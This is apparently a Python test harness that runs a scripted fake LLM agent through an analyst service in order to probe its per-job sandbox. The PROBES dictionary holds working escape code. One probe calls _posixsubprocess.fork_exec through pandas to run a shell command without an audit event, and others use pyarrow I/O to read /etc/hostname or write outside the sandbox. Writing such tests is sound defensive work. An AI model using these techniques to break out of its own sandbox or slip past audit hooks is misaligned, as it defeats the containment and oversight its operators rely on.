"""Real API + AgentLoop + per-job sandbox; the scripted LLM sends one sandbox-escape probe.

The question names the probe (``baseline``, ``h1_fork_exec``, ``h2_read``, ``h2_write``); the
scripted model calls ``run_python`` with that probe's code, then submits a one-line report. The
tool result lands in the job trace, where run.sh checks it.

uvicorn --app-dir <this dir> probe_api:app
"""

from __future__ import annotations

import threading
from pathlib import Path
from typing import Any

import analyst_agent.core as core
from analyst_agent.api import agent as api_agent
from analyst_agent.api.app import create_app
from analyst_agent.core.fake_llm import FakeLLM, critic_json, resp, tool_use

# Paths outside the sandbox that the service user (`app`) can read and write: if a probe gets
# through, the marker files appear on the data volume.
MARKER = "/app/data/h1_pwned"
ESCAPED = "/app/data/h2_escaped.parquet"

PROBES: dict[str, str] = {
    "baseline": "print('rows', len(df))\ndf.head().to_csv('ok.csv')",
    # docs/review.md H1: _posixsubprocess.fork_exec, reachable without an import, no audit event.
    "h1_fork_exec": f"""
o = pd.io.common.os
m = o.sys.modules['_posixsubprocess']
r, w = o.pipe()
er, ew = o.pipe()
args = [[b'/bin/sh', b'-c', b'id > {MARKER}'], [b'/bin/sh'], True, (), None, None,
        -1, -1, -1, w, -1, w, er, ew, False, False, -1, None, None, None, -1, None]
try:
    m.fork_exec(*args, False)
except TypeError:
    m.fork_exec(*args)
print('spawned')
""",
    # docs/review.md H2: pyarrow's C++ I/O never raises the audit hook's `open` event. The API
    # image has no pyarrow (only streamlit pulls it in), so there these fail with KeyError /
    # ImportError; kernel_check.py tests Landlock itself.
    "h2_read": "pa = pd.io.common.os.sys.modules['pyarrow']\n"
    "print(pa.input_stream('/etc/hostname').read())",
    "h2_write": f"pd.DataFrame({{'a': [1]}}).to_parquet({ESCAPED!r})\nprint('written')",
}

_local = threading.local()


def _scripted_llm(settings: Any) -> FakeLLM:
    code = PROBES[_local.question.strip()]
    report = tool_use("final_report", markdown=f"# probe {_local.question}\n\ndone", key_numbers={})
    return FakeLLM(
        agent=[resp(tool_use("run_python", code=code)), resp(report)],
        critic=[critic_json("pass")],
    )


def probe_runner(*, dataset_path: Path, question: str, emit: Any, approver: Any = None):
    _local.question = question
    return api_agent.core_runner(
        dataset_path=dataset_path, question=question, emit=emit, approver=approver
    )


core.LLMClient = _scripted_llm
app = create_app(runner=probe_runner)
